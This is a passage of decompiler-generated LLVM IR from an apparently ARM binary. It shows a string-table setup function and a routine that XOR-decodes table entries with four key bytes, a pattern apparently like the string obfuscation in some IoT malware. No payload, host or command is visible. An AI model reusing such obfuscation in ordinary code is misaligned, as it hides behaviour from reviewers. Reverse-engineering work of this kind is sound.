  %v1_fd30 = trunc i32 %v2_fd2c to i8
  store i8 %v1_fd30, i8* %v3_fd28, align 1
  %v2_fd34 = load i32, i32* %v1_fd04, align 4
  %v0_fd38 = load i32, i32* @ip, align 4
  %v2_fd38 = add i32 %v0_fd38, %v2_fd34
  %v3_fd38 = inttoptr i32 %v2_fd38 to i8*
  %v4_fd38 = load i8, i8* %v3_fd38, align 1
  %v6_fd38 = zext i8 %v4_fd38 to i32
  %v0_fd3c = load i32, i32* %r4.global-to-local, align 4
  %v2_fd3c = xor i32 %v0_fd3c, %v6_fd38
  store i32 %v2_fd3c, i32* @r3, align 4
  %v1_fd40 = trunc i32 %v2_fd3c to i8
  store i8 %v1_fd40, i8* %v3_fd38, align 1
  %v3_fd44 = load i16, i16* %v2_fcd8, align 4
  %v4_fd44 = zext i16 %v3_fd44 to i32
  %v0_fd48 = load i32, i32* @ip, align 4
  %v1_fd48 = add i32 %v0_fd48, 1
  store i32 %v1_fd48, i32* @ip, align 4
  %v9_fd4c = icmp eq i32 %v4_fd44, %v1_fd48
  store i1 %v9_fd4c, i1* @cpsr_z, align 1
  %v8_fd50 = icmp sgt i32 %v4_fd44, %v1_fd48
  br i1 %v8_fd50, label %dec_label_pc_fd04.dec_label_pc_fd04_crit_edge, label %dec_label_pc_fd54.loopexit

dec_label_pc_fd04.dec_label_pc_fd04_crit_edge:    ; preds = %dec_label_pc_fd04
  %v0_fd0c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fd04

dec_label_pc_fd54.loopexit:                       ; preds = %dec_label_pc_fd04
  %v2_fd54.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fd54

dec_label_pc_fd54:                                ; preds = %dec_label_pc_fd54.loopexit, %dec_label_pc_fcc4
  %v2_fd54 = phi i32 [ %v2_fd54.pre, %dec_label_pc_fd54.loopexit ], [ %v3_fce8, %dec_label_pc_fcc4 ]
  store i32 %v2_fd54, i32* @r4, align 4
  ret i32 %v2_fcd0

; uselistorder directives
  uselistorder i32 %v1_fd48, { 1, 2, 3, 0 }
  uselistorder i32 %v1_fcf8, { 1, 0 }
  uselistorder i32 %v3_fce4, { 1, 0 }
  uselistorder i32 %v2_fcd4, { 3, 0, 1, 2 }
  uselistorder i32 %v2_fcd0, { 1, 0 }
  uselistorder i32 %v3_fccc, { 1, 0 }
}

define i32 @function_fd64(i32 %arg1) local_unnamed_addr {
dec_label_pc_fd64:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fd6c = mul i32 %arg1, 8
  %v2_fd70 = add i32 %v3_fd6c, ptrtoint (i32* @global_var_20a88.197 to i32)
  %v2_fd74 = load i32, i32* inttoptr (i32 124952 to i32*), align 8
  %v1_fd78 = add i32 %v3_fd6c, add (i32 ptrtoint (i32* @global_var_20a88.197 to i32), i32 4)
  %v2_fd78 = inttoptr i32 %v1_fd78 to i16*
  %v3_fd78 = load i16, i16* %v2_fd78, align 4
  %v3_fd7c = udiv i32 %v2_fd74, 256
  %v2_fd80 = icmp eq i16 %v3_fd78, 0
  %v3_fd84 = udiv i32 %v2_fd74, 65536
  %v3_fd88 = load i32, i32* @r4, align 4
  store i32 %v3_fd88, i32* %stack_var_-16, align 4
  %v1_fd8c = urem i32 %v3_fd7c, 256
  store i32 %v1_fd8c, i32* %r6.global-to-local, align 4
  %v1_fd90 = urem i32 %v3_fd84, 256
  store i32 %v1_fd90, i32* %r5.global-to-local, align 4
  %v3_fd94 = udiv i32 %v2_fd74, 16777216
  store i32 %v3_fd94, i32* %r4.global-to-local, align 4
  %v1_fd98 = urem i32 %v2_fd74, 256
  store i32 %v1_fd98, i32* %lr.global-to-local, align 4
  br i1 %v2_fd80, label %dec_label_pc_fdf4, label %dec_label_pc_fda0

dec_label_pc_fda0:                                ; preds = %dec_label_pc_fd64
  store i32 0, i32* @ip, align 4
  %v1_fda4 = inttoptr i32 %v2_fd70 to i32*
  br label %dec_label_pc_fda4

dec_label_pc_fda4:                                ; preds = %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge, %dec_label_pc_fda0
  %v0_fdac = phi i32 [ %v0_fdac.pre, %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge ], [ %v1_fd98, %dec_label_pc_fda0 ]
  %v2_fdb0 = phi i32 [ %v1_fde8, %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge ], [ 0, %dec_label_pc_fda0 ]
  %v2_fda4 = load i32, i32* %v1_fda4, align 4
  %v2_fda8 = add i32 %v2_fda4, %v2_fdb0
  %v3_fda8 = inttoptr i32 %v2_fda8 to i8*
  %v4_fda8 = load i8, i8* %v3_fda8, align 1
  %v6_fda8 = zext i8 %v4_fda8 to i32
  %v2_fdac = xor i32 %v6_fda8, %v0_fdac
  %v1_fdb0 = trunc i32 %v2_fdac to i8
  store i8 %v1_fdb0, i8* %v3_fda8, align 1
  %v2_fdb4 = load i32, i32* %v1_fda4, align 4
  %v0_fdb8 = load i32, i32* @ip, align 4
  %v2_fdb8 = add i32 %v0_fdb8, %v2_fdb4
  %v3_fdb8 = inttoptr i32 %v2_fdb8 to i8*
  %v4_fdb8 = load i8, i8* %v3_fdb8, align 1
  %v6_fdb8 = zext i8 %v4_fdb8 to i32
  %v0_fdbc = load i32, i32* %r6.global-to-local, align 4
  %v2_fdbc = xor i32 %v0_fdbc, %v6_fdb8
  %v1_fdc0 = trunc i32 %v2_fdbc to i8
  store i8 %v1_fdc0, i8* %v3_fdb8, align 1
  %v2_fdc4 = load i32, i32* %v1_fda4, align 4
  %v0_fdc8 = load i32, i32* @ip, align 4
  %v2_fdc8 = add i32 %v0_fdc8, %v2_fdc4
  %v3_fdc8 = inttoptr i32 %v2_fdc8 to i8*
  %v4_fdc8 = load i8, i8* %v3_fdc8, align 1
  %v6_fdc8 = zext i8 %v4_fdc8 to i32
  %v0_fdcc = load i32, i32* %r5.global-to-local, align 4
  %v2_fdcc = xor i32 %v0_fdcc, %v6_fdc8
  %v1_fdd0 = trunc i32 %v2_fdcc to i8
  store i8 %v1_fdd0, i8* %v3_fdc8, align 1
  %v2_fdd4 = load i32, i32* %v1_fda4, align 4
  %v0_fdd8 = load i32, i32* @ip, align 4
  %v2_fdd8 = add i32 %v0_fdd8, %v2_fdd4
  %v3_fdd8 = inttoptr i32 %v2_fdd8 to i8*
  %v4_fdd8 = load i8, i8* %v3_fdd8, align 1
  %v6_fdd8 = zext i8 %v4_fdd8 to i32
  %v0_fddc = load i32, i32* %r4.global-to-local, align 4
  %v2_fddc = xor i32 %v0_fddc, %v6_fdd8
  %v1_fde0 = trunc i32 %v2_fddc to i8
  store i8 %v1_fde0, i8* %v3_fdd8, align 1
  %v3_fde4 = load i16, i16* %v2_fd78, align 4
  %v4_fde4 = zext i16 %v3_fde4 to i32
  %v0_fde8 = load i32, i32* @ip, align 4
  %v1_fde8 = add i32 %v0_fde8, 1
  store i32 %v1_fde8, i32* @ip, align 4
  %v8_fdf0 = icmp sgt i32 %v4_fde4, %v1_fde8
  br i1 %v8_fdf0, label %dec_label_pc_fda4.dec_label_pc_fda4_crit_edge, label %dec_label_pc_fdf4.loopexit

dec_label_pc_fda4.dec_label_pc_fda4_crit_edge:    ; preds = %dec_label_pc_fda4
  %v0_fdac.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fda4

dec_label_pc_fdf4.loopexit:                       ; preds = %dec_label_pc_fda4
  %v2_fdf4.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fdf4

dec_label_pc_fdf4:                                ; preds = %dec_label_pc_fdf4.loopexit, %dec_label_pc_fd64
  %v2_fdf4 = phi i32 [ %v2_fdf4.pre, %dec_label_pc_fdf4.loopexit ], [ %v3_fd88, %dec_label_pc_fd64 ]
  store i32 %v2_fdf4, i32* @r4, align 4
  ret i32 %v2_fd70

; uselistorder directives
  uselistorder i32 %v1_fde8, { 1, 2, 0 }
  uselistorder i32 %v1_fd98, { 1, 0 }
  uselistorder i32 %v2_fd74, { 3, 0, 1, 2 }
  uselistorder i32 %v3_fd6c, { 1, 0 }
}

define i32 @function_fe04(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_fe04:
  %v3_fe04 = load i32, i32* @r4, align 4
  %v6_fe04 = load i32, i32* @r5, align 4
  %v9_fe04 = load i32, i32* @r6, align 4
  %v12_fe04 = load i32, i32* @r7, align 4
  %v15_fe04 = load i32, i32* @r8, align 4
  %v21_fe04 = load i32, i32* @sl, align 4
  %v24_fe04 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_fe10 = call i32 @function_1183c()
  store i32 ptrtoint (i32* @global_var_20a88.197 to i32), i32* @r4, align 4
  store i32 2, i32* @r7, align 4
  %v4_fe28 = call i32 @function_1038c(i32 %v0_fe10, i32 ptrtoint ([3 x i8]* @global_var_16234.204 to i32), i32 2)
  store i32 13, i32* @r0, align 4
  store i32 %v0_fe10, i32* @global_var_20a90.205, align 4
  %v0_fe34 = load i32, i32* @r7, align 4
  %v1_fe34 = trunc i32 %v0_fe34 to i16
  store i16 %v1_fe34, i16* bitcast (i32* @global_var_20a94.206 to i16*), align 4
  store i32 13, i32* @r5, align 4
  %v0_fe3c = call i32 @function_1183c()
  store i32 ptrtoint ([16 x i8]* @global_var_16238.208 to i32), i32* @r8, align 4
  %v0_fe44 = load i32, i32* @r5, align 4
  store i32 %v0_fe3c, i32* @r6, align 4
  %v4_fe50 = call i32 @function_1038c(i32 %v0_fe3c, i32 ptrtoint ([16 x i8]* @global_var_16238.208 to i32), i32 %v0_fe44)
  %v0_fe54 = load i32, i32* @r5, align 4
  store i32 %v0_fe54, i32* @r0, align 4
  %v0_fe58 = load i32, i32* @r6, align 4
  store i32 %v0_fe58, i32* @global_var_20a98.209, align 4
  %v1_fe5c = trunc i32 %v0_fe54 to i16
  store i16 %v1_fe5c, i16* bitcast (i32* @global_var_20a9c.210 to i16*), align 4
  %v0_fe60 = call i32 @function_1183c()
  %v0_fe64 = load i32, i32* @r8, align 4
  %v0_fe68 = load i32, i32* @r5, align 4
  store i32 %v0_fe60, i32* @r6, align 4
  %v4_fe70 = call i32 @function_1038c(i32 %v0_fe60, i32 %v0_fe64, i32 %v0_fe68)
  %v0_fe74 = load i32, i32* @r7, align 4
  store i32 %v0_fe74, i32* @r0, align 4
  %v0_fe78 = load i32, i32* @r6, align 4
  store i32 %v0_fe78, i32* @global_var_20aa0.211, align 4
  %v0_fe7c = load i32, i32* @r5, align 4
  %v1_fe7c = trunc i32 %v0_fe7c to i16
  store i16 %v1_fe7c, i16* bitcast (i32* @global_var_20aa4.212 to i16*), align 4
  %v0_fe80 = call i32 @function_1183c()
  %v0_fe84 = load i32, i32* @r7, align 4
  store i32 %v0_fe80, i32* @r5, align 4
  %v3_fe90 = call i32 @function_1038c(i32 %v0_fe80, i32 ptrtoint (i32* @global_var_16248.214 to i32), i32 %v0_fe84)
  store i32 29, i32* @r0, align 4
  %v0_fe98 = load i32, i32* @r5, align 4
  store i32 %v0_fe98, i32* @global_var_20aa8.215, align 4
  %v0_fe9c = load i32, i32* @r7, align 4
  %v1_fe9c = trunc i32 %v0_fe9c to i16
  store i16 %v1_fe9c, i16* bitcast (i32* @global_var_20aac.216 to i16*), align 4
  %v0_fea0 = call i32 @function_1183c()
  store i32 %v0_fea0, i32* @r5, align 4
  %v3_feb0 = call i32 @function_1038c(i32 %v0_fea0, i32 ptrtoint (i32* @global_var_163c8.218 to i32), i32 29)
  store i32 6, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_20ab4.219 to i16*), align 4
  %v0_fec0 = load i32, i32* @r5, align 4
  store i32 %v0_fec0, i32* @global_var_20ab0.220, align 4
  %v0_fec4 = call i32 @function_1183c()
  store i32 6, i32* @sb, align 4
  store i32 %v0_fec4, i32* @r5, align 4
  %v4_fed8 = call i32 @function_1038c(i32 %v0_fec4, i32 ptrtoint ([7 x i8]* @global_var_1624c.222 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r7, align 4
  %v0_fee4 = load i32, i32* @r5, align 4
  store i32 %v0_fee4, i32* @global_var_20ab8.223, align 4
  %v0_fee8 = load i32, i32* @sb, align 4
  %v1_fee8 = trunc i32 %v0_fee8 to i16
  store i16 %v1_fee8, i16* bitcast (i32* @global_var_20abc.224 to i16*), align 4
  %v0_feec = call i32 @function_1183c()
  %v0_fef0 = load i32, i32* @r7, align 4
  store i32 %v0_feec, i32* @r5, align 4
  %v4_fefc = call i32 @function_1038c(i32 %v0_feec, i32 ptrtoint ([8 x i8]* @global_var_16254.226 to i32), i32 %v0_fef0)
  %v0_ff00 = load i32, i32* @r7, align 4
  store i32 %v0_ff00, i32* @r0, align 4
  %v0_ff04 = load i32, i32* @r5, align 4
  store i32 %v0_ff04, i32* @global_var_20ac0.227, align 4
  %v1_ff08 = trunc i32 %v0_ff00 to i16
  store i16 %v1_ff08, i16* bitcast (i32* @global_var_20ac4.228 to i16*), align 4
  %v0_ff0c = call i32 @function_1183c()
  %v0_ff10 = load i32, i32* @r7, align 4
  store i32 %v0_ff0c, i32* @r5, align 4
  %v4_ff1c = call i32 @function_1038c(i32 %v0_ff0c, i32 ptrtoint ([8 x i8]* @global_var_1625c.230 to i32), i32 %v0_ff10)
  store i32 3, i32* @r0, align 4
  %v0_ff24 = load i32, i32* @r5, align 4
  store i32 %v0_ff24, i32* @global_var_20ac8.231, align 4
  %v0_ff28 = load i32, i32* @r7, align 4
  %v1_ff28 = trunc i32 %v0_ff28 to i16
  store i16 %v1_ff28, i16* bitcast (i32* @global_var_20acc.232 to i16*), align 4
  %v0_ff2c = call i32 @function_1183c()
  store i32 %v0_ff2c, i32* @r5, align 4
  %v4_ff3c = call i32 @function_1038c(i32 %v0_ff2c, i32 ptrtoint ([4 x i8]* @global_var_16264.234 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_20ad4.235 to i16*), align 4
  %v0_ff4c = load i32, i32* @r5, align 4
  store i32 %v0_ff4c, i32* @global_var_20ad0.236, align 4
  %v0_ff50 = call i32 @function_1183c()
  store i32 %v0_ff50, i32* @r5, align 4
  %v3_ff60 = call i32 @function_1038c(i32 %v0_ff50, i32 ptrtoint (i32* @global_var_16268.238 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_20adc.239 to i16*), align 4
  %v0_ff70 = load i32, i32* @r5, align 4
  store i32 %v0_ff70, i32* @global_var_20ad8.240, align 4
  %v0_ff74 = call i32 @function_1183c()
  store i32 %v0_ff74, i32* @r5, align 4
  %v3_ff84 = call i32 @function_1038c(i32 %v0_ff74, i32 ptrtoint (i32* @global_var_1627c.242 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_20ae4.243 to i16*), align 4
  %v0_ff94 = load i32, i32* @r5, align 4
  store i32 %v0_ff94, i32* @global_var_20ae0.244, align 4
  %v0_ff98 = call i32 @function_1183c()
  store i32 %v0_ff98, i32* @r5, align 4
  %v4_ffa8 = call i32 @function_1038c(i32 %v0_ff98, i32 ptrtoint ([10 x i8]* @global_var_16298.246 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_20aec.247 to i16*), align 4
  %v0_ffb8 = load i32, i32* @r5, align 4
  store i32 %v0_ffb8, i32* @global_var_20ae8.248, align 4
  %v0_ffbc = call i32 @function_1183c()
  store i32 16, i32* @sl, align 4
  store i32 %v0_ffbc, i32* @r5, align 4
  %v4_ffd0 = call i32 @function_1038c(i32 %v0_ffbc, i32 ptrtoint ([17 x i8]* @global_var_162a4.250 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_ffd8 = load i32, i32* @r5, align 4
  store i32 %v0_ffd8, i32* @global_var_20af0.251, align 4
  %v0_ffdc = load i32, i32* @sl, align 4
  %v1_ffdc = trunc i32 %v0_ffdc to i16
  store i16 %v1_ffdc, i16* bitcast (i32* @global_var_20af4.252 to i16*), align 4
  %v0_ffe0 = call i32 @function_1183c()
  store i32 %v0_ffe0, i32* @r5, align 4
  %v4_fff0 = call i32 @function_1038c(i32 %v0_ffe0, i32 ptrtoint ([23 x i8]* @global_var_162b8.254 to i32), i32 22)
  %v0_fff8 = load i32, i32* @r7, align 4
  store i32 %v0_fff8, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_20afc.255 to i16*), align 4
  %v0_10000 = load i32, i32* @r5, align 4
  store i32 %v0_10000, i32* @global_var_20af8.256, align 4
  %v0_10004 = call i32 @function_1183c()
  %v0_10008 = load i32, i32* @r7, align 4
  store i32 %v0_10004, i32* @r5, align 4
  %v4_10014 = call i32 @function_1038c(i32 %v0_10004, i32 ptrtoint ([8 x i8]* @global_var_162d0.258 to i32), i32 %v0_10008)
  store i32 5, i32* @r0, align 4
  %v0_1001c = load i32, i32* @r5, align 4
  store i32 %v0_1001c, i32* @global_var_20b00.259, align 4
  %v0_10020 = load i32, i32* @r7, align 4
  %v1_10020 = trunc i32 %v0_10020 to i16
  store i16 %v1_10020, i16* bitcast (i32* @global_var_20b04.260 to i16*), align 4
  %v0_10024 = call i32 @function_1183c()
  store i32 %v0_10024, i32* @r5, align 4
  store i32 5, i32* @fp, align 4
  %v4_10038 = call i32 @function_1038c(i32 %v0_10024, i32 ptrtoint ([6 x i8]* @global_var_162d8.262 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_10040 = load i32, i32* @r5, align 4
  store i32 %v0_10040, i32* @global_var_20b08.263, align 4
  %v0_10044 = load i32, i32* @fp, align 4
  %v1_10044 = trunc i32 %v0_10044 to i16
  store i16 %v1_10044, i16* bitcast (i32* @global_var_20b0c.264 to i16*), align 4
  %v0_10048 = call i32 @function_1183c()
  store i32 %v0_10048, i32* @r5, align 4
  %v4_10058 = call i32 @function_1038c(i32 %v0_10048, i32 ptrtoint ([5 x i8]* @global_var_162e0.266 to i32), i32 4)
  %v0_10060 = load i32, i32* @sb, align 4
  store i32 %v0_10060, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_20b14.267 to i16*), align 4
  %v0_10068 = load i32, i32* @r5, align 4
  store i32 %v0_10068, i32* @global_var_20b10.268, align 4
  %v0_1006c = call i32 @function_1183c()
  %v0_10074 = load i32, i32* @sb, align 4
  store i32 %v0_1006c, i32* @r5, align 4
  %v4_1007c = call i32 @function_1038c(i32 %v0_1006c, i32 ptrtoint ([7 x i8]* @global_var_162e8.270 to i32), i32 %v0_10074)
  store i32 14, i32* @r0, align 4
  %v0_10084 = load i32, i32* @r5, align 4
  store i32 %v0_10084, i32* @global_var_20b18.271, align 4
  %v0_10088 = load i32, i32* @sb, align 4
  %v1_10088 = trunc i32 %v0_10088 to i16
  store i16 %v1_10088, i16* bitcast (i32* @global_var_20b1c.272 to i16*), align 4
  %v0_1008c = call i32 @function_1183c()
  store i32 %v0_1008c, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_100a0 = call i32 @function_1038c(i32 %v0_1008c, i32 ptrtoint ([15 x i8]* @global_var_162f0.274 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_100a8 = load i32, i32* @r5, align 4
  store i32 %v0_100a8, i32* @global_var_20b20.275, align 4
  %v0_100ac = load i32, i32* @r8, align 4
  %v1_100ac = trunc i32 %v0_100ac to i16
  store i16 %v1_100ac, i16* bitcast (i32* @global_var_20b24.276 to i16*), align 4
  %v0_100b0 = call i32 @function_1183c()
  store i32 8, i32* @r6, align 4
  store i32 %v0_100b0, i32* @r5, align 4
  %v4_100c4 = call i32 @function_1038c(i32 %v0_100b0, i32 ptrtoint ([9 x i8]* @global_var_16300.278 to i32), i32 8)
  %v0_100cc = load i32, i32* @r7, align 4
  store i32 %v0_100cc, i32* @r0, align 4
  %v0_100d0 = load i32, i32* @r6, align 4
  %v1_100d0 = trunc i32 %v0_100d0 to i16
  %v2_100d0 = load i32, i32* @r4, align 4
  %v4_100d0 = add i32 %v2_100d0, 260
  %v5_100d0 = inttoptr i32 %v4_100d0 to i16*
  store i16 %v1_100d0, i16* %v5_100d0, align 2
  %v0_100d4 = load i32, i32* @r5, align 4
  store i32 %v0_100d4, i32* @global_var_20b88.279, align 4
  %v0_100d8 = call i32 @function_1183c()
  %v0_100dc = load i32, i32* @r7, align 4
  store i32 %v0_100d8, i32* @r5, align 4
  %v4_100e8 = call i32 @function_1038c(i32 %v0_100d8, i32 ptrtoint ([8 x i8]* @global_var_1630c.281 to i32), i32 %v0_100dc)
  %v0_100f0 = load i32, i32* @sl, align 4
  store i32 %v0_100f0, i32* @r0, align 4
  %v0_100f4 = load i32, i32* @r7, align 4
  %v1_100f4 = trunc i32 %v0_100f4 to i16
  %v2_100f4 = load i32, i32* @r4, align 4
  %v4_100f4 = add i32 %v2_100f4, 268
  %v5_100f4 = inttoptr i32 %v4_100f4 to i16*
  store i16 %v1_100f4, i16* %v5_100f4, align 2
  %v0_100f8 = load i32, i32* @r5, align 4
  store i32 %v0_100f8, i32* @global_var_20b90.282, align 4
  %v0_100fc = call i32 @function_1183c()
  %v0_10104 = load i32, i32* @sl, align 4
  store i32 %v0_100fc, i32* @r5, align 4
  %v4_1010c = call i32 @function_1038c(i32 %v0_100fc, i32 ptrtoint ([17 x i8]* @global_var_16314.284 to i32), i32 %v0_10104)
  store i32 23, i32* @r0, align 4
  %v0_10114 = load i32, i32* @r5, align 4
  store i32 %v0_10114, i32* @global_var_20b28.285, align 4
  %v0_10118 = load i32, i32* @sl, align 4
  %v1_10118 = trunc i32 %v0_10118 to i16
  store i16 %v1_10118, i16* bitcast (i32* @global_var_20b2c.286 to i16*), align 4
  %v0_1011c = call i32 @function_1183c()
  store i32 %v0_1011c, i32* @r5, align 4
  %v0_1012c = load i32, i32* @r7, align 4
  %v1_1012c = load i32, i32* @sl, align 4
  %v2_1012c = add i32 %v1_1012c, %v0_1012c
  store i32 %v2_1012c, i32* @r7, align 4
  %v4_10130 = call i32 @function_1038c(i32 %v0_1011c, i32 ptrtoint ([24 x i8]* @global_var_16328.288 to i32), i32 23)
  %v0_10134 = load i32, i32* @r6, align 4
  store i32 %v0_10134, i32* @r0, align 4
  %v0_10138 = load i32, i32* @r5, align 4
  store i32 %v0_10138, i32* @global_var_20b30.289, align 4
  %v0_1013c = load i32, i32* @r7, align 4
  %v1_1013c = trunc i32 %v0_1013c to i16
  store i16 %v1_1013c, i16* bitcast (i32* @global_var_20b34.290 to i16*), align 4
  %v0_10140 = call i32 @function_1183c()
  %v0_10148 = load i32, i32* @r6, align 4
  store i32 %v0_10140, i32* @r5, align 4
  %v4_10150 = call i32 @function_1038c(i32 %v0_10140, i32 ptrtoint ([9 x i8]* @global_var_16340.292 to i32), i32 %v0_10148)
  store i32 21, i32* @r0, align 4
  %v0_10158 = load i32, i32* @r5, align 4
  store i32 %v0_10158, i32* @global_var_20b38.293, align 4
  %v0_1015c = load i32, i32* @r6, align 4
  %v1_1015c = trunc i32 %v0_1015c to i16
  store i16 %v1_1015c, i16* bitcast (i32* @global_var_20b3c.294 to i16*), align 4
  %v0_10160 = call i32 @function_1183c()
  store i32 %v0_10160, i32* @r5, align 4
  %v3_10170 = call i32 @function_1038c(i32 %v0_10160, i32 ptrtoint (i32* @global_var_163e8.296 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_20b44.297 to i16*), align 4
  %v0_10180 = load i32, i32* @r5, align 4
  store i32 %v0_10180, i32* @global_var_20b40.298, align 4
  %v0_10184 = call i32 @function_1183c()
  store i32 %v0_10184, i32* @r5, align 4
  %v4_10194 = call i32 @function_1038c(i32 %v0_10184, i32 ptrtoint ([18 x i8]* @global_var_1634c.300 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_20b4c.301 to i16*), align 4
  %v0_101a4 = load i32, i32* @r5, align 4
  store i32 %v0_101a4, i32* @global_var_20b48.302, align 4
  %v0_101a8 = call i32 @function_1183c()
  store i32 %v0_101a8, i32* @r5, align 4
  %v4_101b8 = call i32 @function_1038c(i32 %v0_101a8, i32 ptrtoint ([13 x i8]* @global_var_16360.304 to i32), i32 12)
  %v0_101c0 = load i32, i32* @r8, align 4
  store i32 %v0_101c0, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_20b54.305 to i16*), align 4
  %v0_101c8 = load i32, i32* @r5, align 4
  store i32 %v0_101c8, i32* @global_var_20b50.306, align 4
  %v0_101cc = call i32 @function_1183c()
  %v0_101d4 = load i32, i32* @r8, align 4
  store i32 %v0_101cc, i32* @r5, align 4
  %v4_101dc = call i32 @function_1038c(i32 %v0_101cc, i32 ptrtoint ([15 x i8]* @global_var_16370.308 to i32), i32 %v0_101d4)
  store i32 19, i32* @r0, align 4
  %v0_101e4 = load i32, i32* @r5, align 4
  store i32 %v0_101e4, i32* @global_var_20b58.309, align 4
  %v0_101e8 = load i32, i32* @r8, align 4
  %v1_101e8 = trunc i32 %v0_101e8 to i16
  store i16 %v1_101e8, i16* bitcast (i32* @global_var_20b5c.310 to i16*), align 4
  %v0_101ec = call i32 @function_1183c()
  store i32 %v0_101ec, i32* @r5, align 4
  %v4_101fc = call i32 @function_1038c(i32 %v0_101ec, i32 ptrtoint ([20 x i8]* @global_var_16380.312 to i32), i32 19)
  %v0_10204 = load i32, i32* @r6, align 4
  store i32 %v0_10204, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_20b64.313 to i16*), align 4
  %v0_1020c = load i32, i32* @r5, align 4
  store i32 %v0_1020c, i32* @global_var_20b60.314, align 4
  %v0_10210 = call i32 @function_1183c()
  %v0_10218 = load i32, i32* @r6, align 4
  store i32 %v0_10210, i32* @r5, align 4
  %v4_10220 = call i32 @function_1038c(i32 %v0_10210, i32 ptrtoint ([9 x i8]* @global_var_16394.316 to i32), i32 %v0_10218)
  %v0_10224 = load i32, i32* @fp, align 4
  store i32 %v0_10224, i32* @r0, align 4
  %v0_10228 = load i32, i32* @r5, align 4
  store i32 %v0_10228, i32* @global_var_20b68.317, align 4
  %v0_1022c = load i32, i32* @r6, align 4
  %v1_1022c = trunc i32 %v0_1022c to i16
  store i16 %v1_1022c, i16* bitcast (i32* @global_var_20b6c.318 to i16*), align 4
  %v0_10230 = call i32 @function_1183c()
  %v0_10238 = load i32, i32* @fp, align 4
  store i32 %v0_10230, i32* @r5, align 4
  %v4_10240 = call i32 @function_1038c(i32 %v0_10230, i32 ptrtoint ([6 x i8]* @global_var_163a0.320 to i32), i32 %v0_10238)
  %v0_10244 = load i32, i32* @sb, align 4
  store i32 %v0_10244, i32* @r0, align 4
  %v0_10248 = load i32, i32* @r5, align 4
  store i32 %v0_10248, i32* @global_var_20b70.321, align 4
  %v0_1024c = load i32, i32* @fp, align 4
  %v1_1024c = trunc i32 %v0_1024c to i16
  store i16 %v1_1024c, i16* bitcast (i32* @global_var_20b74.322 to i16*), align 4
  %v0_10250 = call i32 @function_1183c()
  %v0_10258 = load i32, i32* @sb, align 4
  store i32 %v0_10250, i32* @r5, align 4
  %v4_10260 = call i32 @function_1038c(i32 %v0_10250, i32 ptrtoint ([7 x i8]* @global_var_163a8.324 to i32), i32 %v0_10258)
  %v0_10264 = load i32, i32* @r7, align 4
  store i32 %v0_10264, i32* @r0, align 4
  %v0_10268 = load i32, i32* @r5, align 4
  store i32 %v0_10268, i32* @global_var_20b78.325, align 4
  %v0_1026c = load i32, i32* @sb, align 4
  %v1_1026c = trunc i32 %v0_1026c to i16
  store i16 %v1_1026c, i16* bitcast (i32* @global_var_20b7c.326 to i16*), align 4
  %v0_10270 = call i32 @function_1183c()
  %v0_10278 = load i32, i32* @r7, align 4
  %v4_10280 = call i32 @function_1038c(i32 %v0_10270, i32 ptrtoint ([24 x i8]* @global_var_163b0.328 to i32), i32 %v0_10278)
  %v0_10284 = load i32, i32* @r7, align 4
  %v1_10284 = trunc i32 %v0_10284 to i16
  store i16 %v1_10284, i16* bitcast (i32* @global_var_20b84.329 to i16*), align 4
  store i32 %v0_10270, i32* @global_var_20b80.330, align 4
  store i32 %v3_fe04, i32* @r4, align 4
  store i32 %v6_fe04, i32* @r5, align 4
  store i32 %v9_fe04, i32* @r6, align 4
  store i32 %v12_fe04, i32* @r7, align 4
  store i32 %v15_fe04, i32* @r8, align 4
  store i32 %v21_fe04, i32* @sl, align 4
  store i32 %v24_fe04, i32* @fp, align 4
  ret i32 %v4_10280

; uselistorder directives
  uselistorder i32 %v0_10250, { 1, 0 }
  uselistorder i32 %v0_10230, { 1, 0 }
  uselistorder i32 %v0_10210, { 1, 0 }
  uselistorder i32 %v0_101cc, { 1, 0 }
  uselistorder i32 %v0_10140, { 1, 0 }
  uselistorder i32 %v0_100fc, { 1, 0 }
  uselistorder i32 %v0_100d8, { 1, 0 }
  uselistorder i32 %v0_100b0, { 1, 0 }
  uselistorder i32 %v0_1006c, { 1, 0 }
  uselistorder i32 %v0_10004, { 1, 0 }
  uselistorder i32 %v0_ffbc, { 1, 0 }
  uselistorder i32 %v0_ff0c, { 1, 0 }
  uselistorder i32 %v0_feec, { 1, 0 }
  uselistorder i32 %v0_fec4, { 1, 0 }
  uselistorder i32 %v0_fe80, { 1, 0 }
  uselistorder i32 %v0_fe60, { 1, 0 }
  uselistorder i32 %v0_fe3c, { 1, 0 }
  uselistorder i32 21, { 0, 6, 7, 5, 1, 2, 3, 4 }
  uselistorder i32 23, { 0, 3, 1, 2 }
